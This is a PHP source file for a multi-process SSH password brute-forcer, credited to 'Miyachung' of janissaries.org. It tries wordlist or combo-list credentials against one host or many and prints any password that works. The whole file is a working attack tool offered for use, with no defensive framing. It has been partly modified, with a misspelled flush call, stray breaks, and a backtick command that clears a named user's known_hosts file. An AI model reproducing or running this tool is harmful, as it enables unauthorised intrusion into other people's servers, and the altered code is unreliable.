<?php
/*
        .__                      .__                          
  _____ |__|___.__._____    ____ |  |__  __ __  ____    ____  
 /     \|  <   |  |\__  \ _/ ___\|  |  \|  |  \/    \  / ___\ 
|  Y Y  \  |\___  | / __ \\  \___|   Y  \  |  /   |  \/ /_/  >
|__|_|  /__|/ ____|(____  /\___  >___|  /____/|___|  /\___  / 
      \/    \/          \/     \/     \/           \//_____/  
*	SSH Brute-Forcer
*	Written by Miyachung
*	Homepage	   : http://janissaries.org
*	Youtube Channel: http://www.youtube.com/janissariesorg
*	Usage		   : http://www.youtube.com/watch?v=h5Fx3PBjUCg
*	@@	'ssh2_connect' and 'pcntl_fork' functions must be installed on your machine (BackTrack5 Recommended)
*	@@	This tool is using process forking system
*	All rights reserved
*	Contact with coder: miyachung@hotmail.com or jabber.org
*/
error_reporting(0);
/*
* Call the class
*/
$SSH = new SSHBruter();
/*
* Does control if 'ssh2_connect' and 'pcntl_fork' functions not installed
* if 'ssh2_connect' or 'pcntl_fork' functions not installed you can't use this brute-forcer tool
*/
if(!function_exists("ssh2_connect"))
{
$SSH->showErrorMsg(1);
}
elseif(!function_exists("pcntl_fork"))
{
$SSH->showErrorMsg(2);
}
/*
* Parse arguments
* There is 3 way to brute
* Single	: -h <host> -u <user> -w <wordlist> -o <output> -t <thread>
* Combolist : -c <combolist> -o <output> -t <thread>
* Multiple  : -f <hostfile> -u <user> -w <wordlist> -o <output> -t <thread>
*/
$options_single  = getopt("h:u:w:o:t:");
$options_combo   = getopt("c:o:t:");
$options_multi   = getopt("f:u:w:o:t:");
/*
* Does arguments control!
*/
if($options_single)
{
	if($options_single["h"] != null && $options_single["u"] != null && $options_single["w"] != null && $options_single["o"] != null && $options_single["t"] != null)
	{
	$SSH->SingleBrute( $options_single["h"] , $options_single["u"] , $options_single["w"] , $options_single["o"] , $options_single["t"] );
	}
	else{
	$SSH->showErrorMsg(3);
	}
}
elseif($options_combo)
{
	if($options_combo["c"] != null && $options_combo["o"] != null && $options_combo["t"] != null)
	{
	$SSH->ComboBrute( $options_combo["c"] , $options_combo["o"] , $options_combo["t"] );
	}
	else{
	$SSH->showErrorMsg(3);
	}
}
elseif($options_multi)
{
	if($options_multi["f"] != null && $options_multi["u"] != null & $options_multi["w"] != null && $options_multi["o"] != null && $options_multi["t"] != null)
	{
	$SSH->MultiBrute( $options_multi["f"] , $options_multi["u"] , $options_multi["w"] , $options_multi["o"] , $options_multi["t"] );
	}
	else{
	$SSH->showErrorMsg(3);	
	}
}
else
{
	$SSH->showErrorMsg(3);
}

class SSHBruter
{
	/*
	* Prints 'MAIN_MESSAGE' if arguments used wrong
	*/
	const MAIN_MESSAGE	 	 = "\n*********************************************\n* SSH Brute-Forcer Single or Multiple\n* Written by Miyachung\n* Homepage : http://janissaries.org\n*********************************************\n";
	/*
	* Prints 'NOT_INSTALLED_SSH' if ssh2_connect function not found
	*/
	const NOT_INSTALLED_SSH  = "Oops! 'ssh2_connect' function isn't exists you can't use this tool on this machine\n\n";
	/*
	* Prints 'NOT_INSTALLED_PCNTL' if pcntl_fork function not found
	*/
	const NOT_INSTALLED_PCNTL= "Oops! 'pcntl_fork' function isn't exists you can't use this tool on this machine\n\n";
	/*
	* Prints 'ARGMISS' if arguments not specified
	*/
	const ARGMISS 	 = "[!]Wrong Usage!\nphp SSHBruter.php -h <host> -u <user> -w <wordlist> -o <output> -t <thread>\nphp SSHBruter.php -f <hostfile> -u <user> -w <wordlist> -o <output> -t <thread>\nphp SSHBruter.php -c <combolist> -o <output> -t <thread>\n\n";
	/*
	* Counts hosts & passwords , increments in foreach loop
	*/
	private $counter		 = 0;
	/*
	* Performs brute force to specified single host arguments -h <host> -u <user> -w <wordlist> -o <output> -t <thread>
	*/
	function SingleBrute( $host , $user, $wordlist, $output , $thread )
	{
#	echo "\n";
#	echo "Host: ".$host."\n";
#	echo "User: ".$user."\n\n";
	$chunk_wordlist = array_chunk( file($wordlist) , $thread );
	foreach($chunk_wordlist as $passwords)
	{
		foreach($passwords as $password)
		{
			$this->counter++;
			$fork = pcntl_fork();
			if(!$fork)
			{
			$perform_single = $this->SSH( $host , $user , trim($password) , $output );
			if($perform_single)
			{
			print "Sleeping 120 seconds , PRESS CTRL + C NOW!";
			sleep(120);
			}
			exit;
			}
		}
		$this->waitForThreadFinish();
	}
	
	}
	/*
	* Performs brute force to specified combo list arguments -c <combolist> -o <output> -t <thread>
	*/
	function ComboBrute( $combolist , $output , $thread )
	{
	$chunk_combolist = array_chunk( file($combolist) , $thread);
	foreach($chunk_combolist as $combo)
	{
		foreach($combo as $hostuserpwd)
		{
		$this->counter++;
		list($host,$user,$password) = split(":",trim($hostuserpwd));
		$fork = pcntl_fork();
		if(!$fork)
		{
		$this->SSH( $host , $user , $password , $output );
		exit;
		}
		
		}
		$this->waitForThreadFinish();
	}
	
	}
	/*
	* Performs brute force to specified host list arguments -f <hostfile> -u <user> -w <wordlist> -o <output> -t <thread>
	*/
	function MultiBrute( $hostlist , $user , $wordlist , $output , $thread )
	{
		foreach(file($hostlist) as $host)
		{
			$chunk_wordlist = array_chunk( file($wordlist) , $thread );
			foreach($chunk_wordlist as $passwords)
			{
				foreach($passwords as $password)
				{
				$this->counter++;
				$fork = pcntl_fork();
				if(!$fork)
				{
				$this->SSH( trim($host) , $user , trim($password) , $output );
				exit;
				}
				
				}
				$this->waitForThreadFinish();
			}
		}
	}
	/*
	* Performs login to host with specified user and password(s)
	*/
	function SSH( $host , $user , $password , $output , $port = 22 )
	{
			$connect = ssh2_connect( $host , $port );
			if(!$connect)
			{
			#print "[".$this->counter."] Host: ".$host." Connection Failed\n";
			lush();
			break;
			}
			else
			{
			$auth 	 = ssh2_auth_password( $connect , $user , $password );
			if($auth)
			{
print $host;
#                        `/tmp/php/test.ex $host "$password" $user `;
#file = 'testtime';
#$current="$host";
#file_get_contents($file, $current);
#			$a = "*********************************************\n";
			$a.= "[+] Password: ".$password."\n";
#			$a.= "[+] host: ".$host."\n";
#			
			print $a  ;
#			self::SaveResult( $output , $a );
#			return true;
#			}
#			else
#			{

#			print "[".$this->counter."] Trying Host: ".$host." Username: ".$user." Password: ".$password."\n";
#			flush();
#			break;
`cat /dev/null > /home/leonidle/.ssh/known_hosts `;
#passthru("expect /home/leonidle/scripts/php/test2.ex $host '$password' $user 2>&1" );
break;
exit (0);
break;
			}
			}

	}
	/*
	* All error messages showing from there
	*/
	function showErrorMsg( $errno )
	{
		print self::MAIN_MESSAGE;
		if($errno == 1)
		{
		print self::NOT_INSTALLED_SSH;
		exit;
		}
		if($errno == 2)
		{
		print self::NOT_INSTALLED_PCNTL;
		exit;
		}
		if($errno == 3)
		{
		print self::ARGMISS;
		exit;
		}
		
	}
	/*
	* Waits for threads to finish
	*/
	function waitForThreadFinish()
	{
		while (pcntl_waitpid(0, $status) != -1) {
			$status = pcntl_wexitstatus($status);
		}
	}
	/*
	* Saves everything with this function
	*/
	static function SaveResult( $output,$text )
	{
	$open_file = fopen( $output , "a" );
	fwrite( $open_file , $text );
	fclose( $open_file );
	}
}

# miyachung represents / janissaries.org group 
exit(10);
?>
